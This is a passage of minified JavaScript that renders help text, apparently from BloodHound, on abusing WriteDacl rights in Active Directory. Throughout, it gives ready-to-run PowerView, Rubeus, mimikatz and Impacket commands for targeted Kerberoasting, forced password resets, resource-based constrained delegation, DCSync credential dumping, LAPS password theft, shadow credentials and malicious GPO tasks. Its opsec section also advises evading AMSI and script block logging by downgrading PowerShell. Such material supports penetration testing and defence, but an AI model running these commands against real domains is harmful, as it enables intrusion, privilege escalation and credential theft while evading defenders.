",e,":"]}),h(A,{component:"pre",children:"Set-DomainObject -Credential $Cred -Identity harmj0y -SET @{serviceprincipalname='nonexistent/BLAHBLAH'}"}),h(A,{variant:"body2",children:"After running this, you can use Get-DomainSPNTicket as follows:"}),h(A,{component:"pre",children:"Get-DomainSPNTicket -Credential $Cred harmj0y | fl"}),h(A,{variant:"body2",children:"The recovered hash can be cracked offline using the tool of your choice. Cleanup of the ServicePrincipalName can be done with the Set-DomainObject command:"}),h(A,{component:"pre",children:"Set-DomainObject -Credential $Cred -Identity harmj0y -Clear serviceprincipalname"}),h(A,{variant:"body1",children:"Force Change Password"}),h(A,{variant:"body2",children:"There are at least two ways to execute this attack. The first and most obvious is by using the built-in net.exe binary in Windows (e.g.: net user dfm.a Password123! /domain). See the opsec considerations tab for why this may be a bad idea. The second, and highly recommended method, is by using the Set-DomainUserPassword function in PowerView. This function is superior to using the net.exe binary in several ways. For instance, you can supply alternate credentials, instead of needing to run a process as or logon as the user with the ForceChangePassword privilege. Additionally, you have much safer execution options than you do with spawning net.exe (see the opsec tab)."}),p(A,{variant:"body2",children:["To abuse this privilege with PowerView's Set-DomainUserPassword, first import PowerView into your agent session or into a PowerShell instance at the console. You may need to authenticate to the Domain Controller as"," ","User"===t?`${e} if you are not running a process as that user`:`a member of ${e} if you are not running a process as a member`,". To do this in conjunction with Set-DomainUserPassword, first create a PSCredential object (these examples comes from the PowerView help documentation):"]}),h(A,{component:"pre",children:"$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)"}),h(A,{variant:"body2",children:"Then create a secure string object for the password you want to set on the target user:"}),h(A,{component:"pre",children:"$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force"}),p(A,{variant:"body2",children:["Finally, use Set-DomainUserPassword, optionally specifying $Cred if you are not already running a process as ",e,":"]}),h(A,{component:"pre",children:"Set-DomainUserPassword -Identity andy -AccountPassword $UserPassword -Credential $Cred"}),h(A,{variant:"body2",children:"Now that you know the target user's plain text password, you can either start a new agent as that user, or use that user's credentials in conjunction with PowerView's ACL abuse functions, or perhaps even RDP to a system the target user has access to. For more ideas and information, see the references tab."}),h(A,{variant:"body2",children:"Cleanup of the added ACL can be performed with Remove-DomainObjectAcl:"}),h(A,{component:"pre",children:"Remove-DomainObjectAcl -Credential $Cred -TargetIdentity harmj0y -Rights All"})]});case"Computer":return p(u,a?{children:[h(A,{variant:"body2",children:"To abuse WriteDacl to a computer object, you may grant yourself the GenericAll privilege."}),p(A,{variant:"body2",children:["You may need to authenticate to the Domain Controller as"," ","User"===t?`${e} if you are not running a process as that user`:`a member of ${e} if you are not running a process as a member`,". To do this in conjunction with Add-DomainObjectAcl, first create a PSCredential object (these examples comes from the PowerView help documentation):"]}),h(A,{component:"pre",children:"$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)"}),p(A,{variant:"body2",children:["Then, use Add-DomainObjectAcl, optionally specifying $Cred if you are not already running a process as ",e,":"]}),h(A,{component:"pre",children:"Add-DomainObjectAcl -Credential $Cred -TargetIdentity windows1 -Rights All"}),h(A,{variant:"body2",children:"Once you have granted yourself this privilege, you may read the ms-Ads-AdmPwd attribute on the computer object in LDAP which contains the local administrator password."}),h(A,{variant:"body2",children:"Alternatively, you can execute a resource based constrained delegation attack."}),h(A,{variant:"body2",children:"Abusing this primitive is currently only possible through the Rubeus project."}),h(A,{variant:"body2",children:"First, if an attacker does not control an account with an SPN set, Kevin Robertson's Powermad project can be used to add a new attacker-controlled computer account:"}),h(A,{component:"pre",children:"New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)"}),h(A,{variant:"body2",children:"PowerView can be used to then retrieve the security identifier (SID) of the newly created computer account:"}),h(A,{component:"pre",children:"$ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid"}),h(A,{variant:"body2",children:"We now need to build a generic ACE with the attacker-added computer SID as the principal, and get the binary bytes for the new DACL/ACE:"}),h(A,{component:"pre",children:'$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"\n$SDBytes = New-Object byte[] ($SD.BinaryLength)\n$SD.GetBinaryForm($SDBytes, 0)'}),h(A,{variant:"body2",children:"Next, we need to set this newly created security descriptor in the msDS-AllowedToActOnBehalfOfOtherIdentity field of the comptuer account we're taking over, again using PowerView in this case:"}),h(A,{component:"pre",children:"Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}"}),h(A,{variant:"body2",children:"We can then use Rubeus to hash the plaintext password into its RC4_HMAC form:"}),h(A,{component:"pre",children:"Rubeus.exe hash /password:Summer2018!"}),h(A,{variant:"body2",children:'And finally we can use Rubeus\' *s4u* module to get a service ticket for the service name (sname) we want to "pretend" to be "admin" for. This ticket is injected (thanks to /ptt), and in this case grants us access to the file system of the TARGETCOMPUTER:'}),h(A,{component:"pre",children:"Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:admin /msdsspn:cifs/TARGETCOMPUTER.testlab.local /ptt"}),h(A,{variant:"body2",children:"Cleanup can be done using the Remove-DomainObjectAcl function:"}),h(A,{component:"pre",children:"Remove-DomainObjectAcl -Credential $Cred -TargetIdentity windows1 -Rights All"})]}:{children:[h(A,{variant:"body2",children:"To abuse WriteDacl to a computer object, you may grant yourself the GenericAll privilege."}),p(A,{variant:"body2",children:["You may need to authenticate to the Domain Controller as"," ","User"===t?`${e} if you are not running a process as that user`:`a member of ${e} if you are not running a process as a member`,". To do this in conjunction with Add-DomainObjectAcl, first create a PSCredential object (these examples comes from the PowerView help documentation):"]}),h(A,{component:"pre",children:"$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)"}),p(A,{variant:"body2",children:["Then, use Add-DomainObjectAcl, optionally specifying $Cred if you are not already running a process as ",e,":"]}),h(A,{component:"pre",children:"Add-DomainObjectAcl -Credential $Cred -TargetIdentity windows1 -Rights All"}),h(A,{variant:"body2",children:"Once you have granted yourself this privilege, you can execute a resource based constrained delegation attack."}),h(A,{variant:"body2",children:"Abusing this primitive is currently only possible through the Rubeus project."}),h(A,{variant:"body2",children:"First, if an attacker does not control an account with an SPN set, Kevin Robertson's Powermad project can be used to add a new attacker-controlled computer account:"}),h(A,{component:"pre",children:"New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)"}),h(A,{variant:"body2",children:"PowerView can be used to then retrieve the security identifier (SID) of the newly created computer account:"}),h(A,{component:"pre",children:"$ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid"}),h(A,{variant:"body2",children:"We now need to build a generic ACE with the attacker-added computer SID as the principal, and get the binary bytes for the new DACL/ACE:"}),h(A,{component:"pre",children:'$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"\n$SDBytes = New-Object byte[] ($SD.BinaryLength)\n$SD.GetBinaryForm($SDBytes, 0)'}),h(A,{variant:"body2",children:"Next, we need to set this newly created security descriptor in the msDS-AllowedToActOnBehalfOfOtherIdentity field of the comptuer account we're taking over, again using PowerView in this case:"}),h(A,{component:"pre",children:"Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}"}),h(A,{variant:"body2",children:"We can then use Rubeus to hash the plaintext password into its RC4_HMAC form:"}),h(A,{component:"pre",children:"Rubeus.exe hash /password:Summer2018!"}),h(A,{variant:"body2",children:'And finally we can use Rubeus\' *s4u* module to get a service ticket for the service name (sname) we want to "pretend" to be "admin" for. This ticket is injected (thanks to /ptt), and in this case grants us access to the file system of the TARGETCOMPUTER:'}),h(A,{component:"pre",children:"Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:admin /msdsspn:cifs/TARGETCOMPUTER.testlab.local /ptt"}),h(A,{variant:"body2",children:"Cleanup can be done using the Remove-DomainObjectAcl function:"}),h(A,{component:"pre",children:"Remove-DomainObjectAcl -Credential $Cred -TargetIdentity windows1 -Rights All"})]});case"Domain":return p(u,{children:[h(A,{variant:"body2",children:"To abuse WriteDacl to a domain object, you may grant yourself DCSync privileges."}),p(A,{variant:"body2",children:["You may need to authenticate to the Domain Controller as"," ","User"===t?`${e} if you are not running a process as that user`:`a member of ${e} if you are not running a process as a member`,". To do this in conjunction with Add-DomainObjectAcl, first create a PSCredential object (these examples comes from the PowerView help documentation):"]}),h(A,{component:"pre",children:"$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)"}),p(A,{variant:"body2",children:["Then, use Add-DomainObjectAcl, optionally specifying $Cred if you are not already running a process as ",e,":"]}),h(A,{component:"pre",children:"Add-DomainObjectAcl -Credential $Cred -TargetIdentity testlab.local -Rights DCSync"}),h(A,{variant:"body2",children:"Once you have granted yourself this privilege, you may use the mimikatz dcsync function to dcsync the password of arbitrary principals on the domain"}),h(A,{component:"pre",children:"lsadump::dcsync /domain:testlab.local /user:Administrator"}),h(A,{variant:"body2",children:"Cleanup can be done using the Remove-DomainObjectAcl function:"}),h(A,{component:"pre",children:"Remove-DomainObjectAcl -Credential $Cred -TargetIdentity testlab.local -Rights DCSync"}),h(A,{variant:"body2",children:"You can also abuse this without using Windows-based tooling if you are operating from a Linux host. DCSync.py from n00py will let you authenticate with either a plaintext password, NT hash, or kerberos ticket:"}),h(A,{variant:"body2",children:'To grant the "n00py" user DCSync privileges, authenticating as the user "n00py" with the password "Password123":'}),h(A,{component:"pre",children:"./dcsync.py -dc dc01.n00py.local -t 'CN=n00py,OU=Employees,DC=n00py,DC=local'  n00pyAdministrator:Password123"}),p(A,{variant:"body2",children:["Source:"," ",h(S,{target:"_blank",rel:"noopener",href:"https://github.com/n00py/DCSync",children:"https://github.com/n00py/DCSync"})]})]});case"GPO":return p(u,{children:[h(A,{variant:"body2",children:"To abuse WriteDacl to a GPO object, you may grant yourself the GenericAll privilege."}),p(A,{variant:"body2",children:["You may need to authenticate to the Domain Controller as"," ","User"===t?`${e} if you are not running a process as that user`:`a member of ${e} if you are not running a process as a member`,". To do this in conjunction with Add-DomainObjectAcl, first create a PSCredential object (these examples comes from the PowerView help documentation):"]}),h(A,{component:"pre",children:"$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)"}),p(A,{variant:"body2",children:["Then, use Add-DomainObjectAcl, optionally specifying $Cred if you are not already running a process as ",e,":"]}),h(A,{component:"pre",children:"Add-DomainObjectAcl -Credential $Cred -TargetIdentity TestGPO -Rights All"}),h(A,{variant:"body2",children:"With full control of a GPO, you may make modifications to that GPO which will then apply to the users and computers affected by the GPO. Select the target object you wish to push an evil policy down to, then use the gpedit GUI to modify the GPO, using an evil policy that allows item-level targeting, such as a new immediate scheduled task. Then wait at least 2 hours for the group policy client to pick up and execute the new evil policy. See the references tab for a more detailed write up on this abuse"}),h(A,{variant:"body2",children:"Cleanup can be done using the Remove-DomainObjectAcl function:"}),h(A,{component:"pre",children:"Remove-DomainObjectAcl -Credential $Cred -TargetIdentity TestGPO -Rights All"})]});case"OU":return p(u,{children:[h(A,{variant:"body1",children:"Control of the Organizational Unit"}),h(A,{variant:"body2",children:"With WriteDACL access on the OU object, you may grant yourself GenericAll against the OU, and then set another ACE on the OU that will inherit down to its descendent objects. First, you will need to set a GenericAll ACE against the OU object itself. This can be accomplished using the Add-DomainObjectAcl function in PowerView."}),p(A,{variant:"body2",children:["You may need to authenticate to the Domain Controller as"," ","User"===t?`${e} if you are not running a process as that user`:`a member of ${e} if you are not running a process as a member`," ","if you are not running a process as a member of that group. To do this in conjunction with Add-DomainObjectACL, first create a PSCredential object (these examples comes from the PowerView help documentation):"]}),h(A,{component:"pre",children:"$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)"}),h(A,{variant:"body2",children:"Then, use Add-DomainObjectAcl, optionally specifying $Cred if you are not already running a process as a member of (group that holds the ACE against the OU):"}),h(A,{component:"pre",children:"Add-DomainObjectAcl -Credential $Cred -TargetIdentity (OU GUID) -Rights All"}),h(A,{variant:"body2",children:"With full control of the OU, you may now add a new ACE on the OU that will inherit down to the objects under that OU. Below are two options depending on how targeted you choose to be in this step:"}),h(A,{variant:"body1",children:"Generic Descendent Object Takeover"}),h(A,{variant:"body2",children:"The simplest and most straight forward way to abuse control of the OU is to apply a GenericAll ACE on the OU that will inherit down to all object types. Again, this can be done using PowerView. This time we will use the New-ADObjectAccessControlEntry, which gives us more control over the ACE we add to the OU."}),p(A,{variant:"body2",children:["First, we need to reference the OU by its ObjectGUID, not its name. The ObjectGUID for the OU"," ",r," is: ",o,"."]}),p(A,{variant:"body2",children:["Next, we will fetch the GUID for all objects. This should be"," ",h(A,{component:"pre",children:"00000000-0000-0000-0000-000000000000"}),":"]}),h(A,{component:"pre",children:"$Guids = Get-DomainGUIDMap\n$AllObjectsPropertyGuid = $Guids.GetEnumerator() | ?{$_.value -eq 'All'} | select -ExpandProperty name"}),h(A,{variant:"body2",children:'Then we will construct our ACE. This command will create an ACE granting the "JKHOLER" user full control of all descendant objects:'}),h(A,{component:"pre",children:"$ACE = New-ADObjectAccessControlEntry -Verbose -PrincipalIdentity 'JKOHLER' -Right GenericAll -AccessControlType Allow -InheritanceType All -InheritedObjectType $AllObjectsPropertyGuid"}),h(A,{variant:"body2",children:"Finally, we will apply this ACE to our target OU:"}),h(A,{component:"pre",children:"$OU = Get-DomainOU -Raw (OU GUID)\n$DsEntry = $OU.GetDirectoryEntry()\n$dsEntry.PsBase.Options.SecurityMasks = 'Dacl'\n$dsEntry.PsBase.ObjectSecurity.AddAccessRule($ACE)\n$dsEntry.PsBase.CommitChanges()"}),h(A,{variant:"body2",children:'Now, the "JKOHLER" user will have full control of all descendent objects of each type.'}),h(A,{variant:"body1",children:"Targeted Descendent Object Takeoever"}),h(A,{variant:"body2",children:'If you want to be more targeted with your approach, it is possible to specify precisely what right you want to apply to precisely which kinds of descendent objects. You could, for example, grant a user "ForceChangePassword" privilege against all user objects, or grant a security group the ability to read every GMSA password under a certain OU. Below is an example taken from PowerView\'s help text on how to grant the "ITADMIN" user the ability to read the LAPS password from all computer objects in the "Workstations" OU:'}),h(A,{component:"pre",children:"$Guids = Get-DomainGUIDMap\n$AdmPropertyGuid = $Guids.GetEnumerator() | ?{$_.value -eq 'ms-Mcs-AdmPwd'} | select -ExpandProperty name\n$CompPropertyGuid = $Guids.GetEnumerator() | ?{$_.value -eq 'Computer'} | select -ExpandProperty name\n$ACE = New-ADObjectAccessControlEntry -Verbose -PrincipalIdentity itadmin -Right ExtendedRight,ReadProperty -AccessControlType Allow -ObjectType $AdmPropertyGuid -InheritanceType All -InheritedObjectType $CompPropertyGuid\n$OU = Get-DomainOU -Raw Workstations\n$DsEntry = $OU.GetDirectoryEntry()\n$dsEntry.PsBase.Options.SecurityMasks = 'Dacl'\n$dsEntry.PsBase.ObjectSecurity.AddAccessRule($ACE)\n$dsEntry.PsBase.CommitChanges()"})]});default:return null}},linuxAbuse:({sourceName:e,sourceType:t,targetName:r,targetType:n,targetId:o,haslaps:a})=>{switch(n){case"Group":return p(u,{children:[h(A,{variant:"body1",children:" Modifying the rights "}),h(A,{variant:"body2",children:"To abuse WriteDacl to a group object, you may grant yourself the AddMember privilege."}),h(A,{variant:"body2",children:'Impacket\'s dacledit can be used for that purpose (cf. "grant rights" reference for the link).'}),h(A,{component:"pre",children:"dacledit.py -action 'write' -rights 'WriteMembers' -principal 'controlledUser' -target-dn 'groupDistinguidedName' 'domain'/'controlledUser':'password'"}),h(A,{variant:"body1",children:" Adding to the group "}),h(A,{variant:"body2",children:"You can now add members to the group."}),h(A,{variant:"body2",children:"Use samba's net tool to add the user to the target group. The credentials can be supplied in cleartext or prompted interactively if omitted from the command line:"}),h(A,{component:"pre",children:'net rpc group addmem "TargetGroup" "TargetUser" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"'}),p(A,{variant:"body2",children:["Pass-the-hash can also be done here with"," ",h(S,{target:"_blank",rel:"noopener",href:"https://github.com/byt3bl33d3r/pth-toolkit",children:"pth-toolkit's net tool"}),". If the LM hash is not known it must be replace with"," ",h(A,{component:"pre",children:"ffffffffffffffffffffffffffffffff"}),"."]}),h(A,{component:"pre",children:'pth-net rpc group addmem "TargetGroup" "TargetUser" -U "DOMAIN"/"ControlledUser"%"LMhash":"NThash" -S "DomainController"'}),h(A,{variant:"body2",children:"Finally, verify that the user was successfully added to the group:"}),h(A,{component:"pre",children:'net rpc group members "TargetGroup" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"'}),h(A,{variant:"body1",children:" Cleanup "}),h(A,{variant:"body2",children:'Impacket\'s dacledit can be used for that purpose (cf. "grant rights" reference for the link).'}),h(A,{component:"pre",children:"dacledit.py -action 'remove' -rights 'WriteMembers' -principal 'controlledUser' -target-dn 'groupDistinguidedName' 'domain'/'controlledUser':'password'"})]});case"User":return p(u,{children:[h(A,{variant:"body2",children:"To abuse WriteDacl to a user object, you may grant yourself the GenericAll privilege."}),h(A,{variant:"body2",children:'Impacket\'s dacledit can be used for that purpose (cf. "grant rights" reference for the link).'}),h(A,{component:"pre",children:"dacledit.py -action 'write' -rights 'FullControl' -principal 'controlledUser' -target 'targetUser' 'domain'/'controlledUser':'password'"}),h(A,{variant:"body2",children:"Cleanup of the added ACL can be performed later on with the same tool:"}),h(A,{variant:"body1",children:" Targeted Kerberoast "}),p(A,{variant:"body2",children:["A targeted kerberoast attack can be performed using"," ",h(S,{target:"_blank",rel:"noopener",href:"https://github.com/ShutdownRepo/targetedKerberoast",children:"targetedKerberoast.py"}),"."]}),h(A,{component:"pre",children:"targetedKerberoast.py -v -d 'domain.local' -u 'controlledUser' -p 'ItsPassword'"}),h(A,{variant:"body2",children:"The tool will automatically attempt a targetedKerberoast attack, either on all users or against a specific one if specified in the command line, and then obtain a crackable hash. The cleanup is done automatically as well."}),h(A,{variant:"body2",children:"The recovered hash can be cracked offline using the tool of your choice."}),h(A,{variant:"body1",children:" Force Change Password "}),h(A,{variant:"body2",children:"Use samba's net tool to change the user's password. The credentials can be supplied in cleartext or prompted interactively if omitted from the command line. The new password will be prompted if omitted from the command line."}),h(A,{component:"pre",children:'net rpc password "TargetUser" "newP@ssword2022" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"'}),p(A,{variant:"body2",children:["Pass-the-hash can also be done here with"," ",h(S,{target:"_blank",rel:"noopener",href:"https://github.com/byt3bl33d3r/pth-toolkit",children:"pth-toolkit's net tool"}),". If the LM hash is not known it must be replace with"," ",h(A,{component:"pre",children:"ffffffffffffffffffffffffffffffff"}),"."]}),h(A,{component:"pre",children:'pth-net rpc password "TargetUser" "newP@ssword2022" -U "DOMAIN"/"ControlledUser"%"LMhash":"NThash" -S "DomainController"'}),h(A,{variant:"body2",children:"Now that you know the target user's plain text password, you can either start a new agent as that user, or use that user's credentials in conjunction with PowerView's ACL abuse functions, or perhaps even RDP to a system the target user has access to. For more ideas and information, see the references tab."}),h(A,{variant:"body1",children:" Shadow Credentials attack "}),p(A,{variant:"body2",children:["To abuse this privilege, use"," ",h(S,{target:"_blank",rel:"noopener",href:"https://github.com/ShutdownRepo/pywhisker",children:"pyWhisker"}),"."]}),h(A,{component:"pre",children:'pywhisker.py -d "domain.local" -u "controlledAccount" -p "somepassword" --target "targetAccount" --action "add"'}),h(A,{variant:"body2",children:"For other optional parameters, view the pyWhisker documentation."})]});case"Computer":return p(u,a?{children:[h(A,{variant:"body2",children:"To abuse WriteDacl to a computer object, you may grant yourself the GenericAll privilege."}),h(A,{variant:"body2",children:'Impacket\'s dacledit can be used for that purpose (cf. "grant rights" reference for the link).'}),h(A,{component:"pre",children:"dacledit.py -action 'write' -rights 'FullControl' -principal 'controlledUser' -target 'targetUser' 'domain'/'controlledUser':'password'"}),h(A,{variant:"body2",children:"Cleanup of the added ACL can be performed later on with the same tool:"}),h(A,{variant:"body1",children:" Retrieve LAPS Password "}),h(A,{variant:"body2",children:"Full control of a computer object is abusable when the computer's local admin account credential is controlled with LAPS. The clear-text password for the local administrator account is stored in an extended attribute on the computer object called ms-Mcs-AdmPwd. With full control of the computer object, you may have the ability to read this attribute, or grant yourself the ability to read the attribute by modifying the computer object's security descriptor."}),p(A,{variant:"body2",children:[h(S,{target:"_blank",rel:"noopener",href:"https://github.com/p0dalirius/pyLAPS",children:"pyLAPS"})," ","can be used to retrieve LAPS passwords:"]}),h(A,{component:"pre",children:'pyLAPS.py --action get -d "DOMAIN" -u "ControlledUser" -p "ItsPassword"'}),h(A,{variant:"body1",children:" Resource-Based Constrained Delegation "}),h(A,{variant:"body2",children:"First, if an attacker does not control an account with an SPN set, a new attacker-controlled computer account can be added with Impacket's addcomputer.py example script:"}),h(A,{component:"pre",children:"addcomputer.py -method LDAPS -computer-name 'ATTACKERSYSTEM$' -computer-pass 'Summer2018!' -dc-host $DomainController -domain-netbios $DOMAIN 'domain/user:password'"}),h(A,{variant:"body2",children:"We now need to configure the target object so that the attacker-controlled computer can delegate to it. Impacket's rbcd.py script can be used for that purpose:"}),h(A,{component:"pre",children:"rbcd.py -delegate-from 'ATTACKERSYSTEM$' -delegate-to 'TargetComputer' -action 'write' 'domain/user:password'"}),h(A,{variant:"body2",children:'And finally we can get a service ticket for the service name (sname) we want to "pretend" to be "admin" for. Impacket\'s getST.py example script can be used for that purpose.'}),h(A,{component:"pre",children:"getST.py -spn 'cifs/targetcomputer.testlab.local' -impersonate 'admin' 'domain/attackersystem$:Summer2018!'"}),h(A,{variant:"body2",children:"This ticket can then be used with Pass-the-Ticket, and could grant access to the file system of the TARGETCOMPUTER."}),h(A,{variant:"body1",children:" Shadow Credentials attack "}),p(A,{variant:"body2",children:["To abuse this privilege, use"," ",h(S,{target:"_blank",rel:"noopener",href:"https://github.com/ShutdownRepo/pywhisker",children:"pyWhisker"}),"."]}),h(A,{component:"pre",children:'pywhisker.py -d "domain.local" -u "controlledAccount" -p "somepassword" --target "targetAccount" --action "add"'}),h(A,{variant:"body2",children:"For other optional parameters, view the pyWhisker documentation."})]}:{children:[h(A,{variant:"body2",children:"To abuse WriteDacl to a computer object, you may grant yourself the GenericAll privilege."}),h(A,{variant:"body2",children:'Impacket\'s dacledit can be used for that purpose (cf. "grant rights" reference for the link).'}),h(A,{component:"pre",children:"dacledit.py -action 'write' -rights 'FullControl' -principal 'controlledUser' -target 'targetUser' 'domain'/'controlledUser':'password'"}),h(A,{variant:"body2",children:"Cleanup of the added ACL can be performed later on with the same tool:"}),h(A,{variant:"body1",children:" Resource-Based Constrained Delegation "}),h(A,{variant:"body2",children:"First, if an attacker does not control an account with an SPN set, a new attacker-controlled computer account can be added with Impacket's addcomputer.py example script:"}),h(A,{component:"pre",children:"addcomputer.py -method LDAPS -computer-name 'ATTACKERSYSTEM$' -computer-pass 'Summer2018!' -dc-host $DomainController -domain-netbios $DOMAIN 'domain/user:password'"}),h(A,{variant:"body2",children:"We now need to configure the target object so that the attacker-controlled computer can delegate to it. Impacket's rbcd.py script can be used for that purpose:"}),h(A,{component:"pre",children:"rbcd.py -delegate-from 'ATTACKERSYSTEM$' -delegate-to 'TargetComputer' -action 'write' 'domain/user:password'"}),h(A,{variant:"body2",children:'And finally we can get a service ticket for the service name (sname) we want to "pretend" to be "admin" for. Impacket\'s getST.py example script can be used for that purpose.'}),h(A,{component:"pre",children:"getST.py -spn 'cifs/targetcomputer.testlab.local' -impersonate 'admin' 'domain/attackersystem$:Summer2018!'"}),h(A,{variant:"body2",children:"This ticket can then be used with Pass-the-Ticket, and could grant access to the file system of the TARGETCOMPUTER."}),h(A,{variant:"body1",children:" Shadow Credentials attack "}),p(A,{variant:"body2",children:["To abuse this privilege, use"," ",h(S,{target:"_blank",rel:"noopener",href:"https://github.com/ShutdownRepo/pywhisker",children:"pyWhisker"}),"."]}),h(A,{component:"pre",children:'pywhisker.py -d "domain.local" -u "controlledAccount" -p "somepassword" --target "targetAccount" --action "add"'}),h(A,{variant:"body2",children:"For other optional parameters, view the pyWhisker documentation."})]});case"Domain":return p(u,{children:[h(A,{variant:"body2",children:"To abuse WriteDacl to a domain object, you may grant yourself the DcSync privileges."}),h(A,{variant:"body2",children:'Impacket\'s dacledit can be used for that purpose (cf. "grant rights" reference for the link).'}),h(A,{component:"pre",children:"dacledit.py -action 'DCSync' -rights 'FullControl' -principal 'controlledUser' -target-dn 'DomainDisinguishedName' 'domain'/'controlledUser':'password'"}),h(A,{variant:"body2",children:"Cleanup of the added ACL can be performed later on with the same tool:"}),h(A,{variant:"body1",children:" DCSync "}),p(A,{variant:"body2",children:["The AllExtendedRights privilege grants ",e," both the DS-Replication-Get-Changes and DS-Replication-Get-Changes-All privileges, which combined allow a principal to replicate objects from the domain ",r,"."]}),h(A,{variant:"body2",children:"This can be abused using Impacket's secretsdump.py example script:"}),h(A,{component:"pre",children:"secretsdump 'DOMAIN'/'USER':'PASSWORD'@'DOMAINCONTROLLER'"}),h(A,{variant:"body1",children:" Retrieve LAPS Passwords "}),p(A,{variant:"body2",children:["If FullControl (GenericAll) is obtained on the domain, instead of granting DCSync rights, the AllExtendedRights privilege included grants ",e," enough privileges to retrieve LAPS passwords domain-wise."]}),p(A,{variant:"body2",children:[h(S,{target:"_blank",rel:"noopener",href:"https://github.com/p0dalirius/pyLAPS",children:"pyLAPS"})," ","can be used for that purpose:"]}),h(A,{component:"pre",children:'pyLAPS.py --action get -d "DOMAIN" -u "ControlledUser" -p "ItsPassword"'})]});case"GPO":return p(u,{children:[h(A,{variant:"body2",children:"To abuse WriteDacl to a GPO, you may grant yourself the GenericAll privilege."}),h(A,{variant:"body2",children:'Impacket\'s dacledit can be used for that purpose (cf. "grant rights" reference for the link).'}),h(A,{component:"pre",children:"dacledit.py -action 'write' -rights 'FullControl' -principal 'controlledUser' -target 'targetUser' 'domain'/'controlledUser':'password'"}),h(A,{variant:"body2",children:"Cleanup of the added ACL can be performed later on with the same tool:"}),h(A,{variant:"body2",children:"With full control of a GPO, you may make modifications to that GPO which will then apply to the users and computers affected by the GPO. Select the target object you wish to push an evil policy down to, then use the gpedit GUI to modify the GPO, using an evil policy that allows item-level targeting, such as a new immediate scheduled task. Then wait at least 2 hours for the group policy client to pick up and execute the new evil policy. See the references tab for a more detailed write up on this abuse."}),p(A,{variant:"body2",children:[h(S,{target:"_blank",rel:"noopener",href:"https://github.com/Hackndo/pyGPOAbuse",children:"pyGPOAbuse.py"})," ","can be used for that purpose."]})]});case"OU":return p(u,{children:[h(A,{variant:"body1",children:"Control of the Organization Unit"}),h(A,{variant:"body2",children:"With WriteDacl to an OU object, you may grant yourself the GenericAll privilege."}),h(A,{variant:"body1",children:"Generic Descendent Object Takeover"}),h(A,{variant:"body2",children:'The simplest and most straight forward way to abuse control of the OU is to apply a GenericAll ACE on the OU that will inherit down to all object types. This can be done using Impacket\'s dacledit (cf. "grant rights" reference for the link).'}),h(A,{component:"pre",children:"dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal 'JKHOLER' -target-dn 'OUDistinguishedName' 'domain'/'user':'password'"}),h(A,{variant:"body2",children:'Now, the "JKOHLER" user will have full control of all descendent objects of each type.'}),h(A,{variant:"body1",children:"Targeted Descendent Object Takeoever"}),h(A,{variant:"body2",children:"If you want to be more targeted with your approach, it is possible to specify precisely what right you want to apply to precisely which kinds of descendent objects. Refer to the Windows Abuse info for this."})]});case"Container":return p(u,{children:[h(A,{variant:"body1",children:"Control of the Container"}),h(A,{variant:"body2",children:"With WriteDacl to a container object, you may grant yourself the GenericAll privilege."}),h(A,{variant:"body1",children:"Generic Descendent Object Takeover"}),h(A,{variant:"body2",children:'The simplest and most straight forward way to abuse control of the OU is to apply a GenericAll ACE on the OU that will inherit down to all object types. This can be done using Impacket\'s dacledit (cf. "grant rights" reference for the link).'}),h(A,{component:"pre",children:"dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal 'JKHOLER' -target-dn 'containerDistinguishedName' 'domain'/'user':'password'"}),h(A,{variant:"body2",children:'Now, the "JKOHLER" user will have full control of all descendent objects of each type.'}),h(A,{variant:"body1",children:"Targeted Descendent Object Takeoever"}),h(A,{variant:"body2",children:"If you want to be more targeted with your approach, it is possible to specify precisely what right you want to apply to precisely which kinds of descendent objects. Refer to the Windows Abuse info for this."})]});default:return null}},opsec:()=>p(u,{children:[h(A,{variant:"body2",children:"When using the PowerView functions, keep in mind that PowerShell v5 introduced several security mechanisms that make it much easier for defenders to see what's going on with PowerShell in their network, such as script block logging and AMSI. You can bypass those security mechanisms by downgrading to PowerShell v2, which all PowerView functions support."}),h(A,{variant:"body2",children:"Modifying permissions on an object will generate 4670 and 4662 events on the domain controller that handled the request."}),h(A,{variant:"body2",children:"Additional opsec considerations depend on the target object and how to take advantage of this privilege. Opsec considerations for each abuse primitive are documented on the specific abuse edges and on the BloodHound 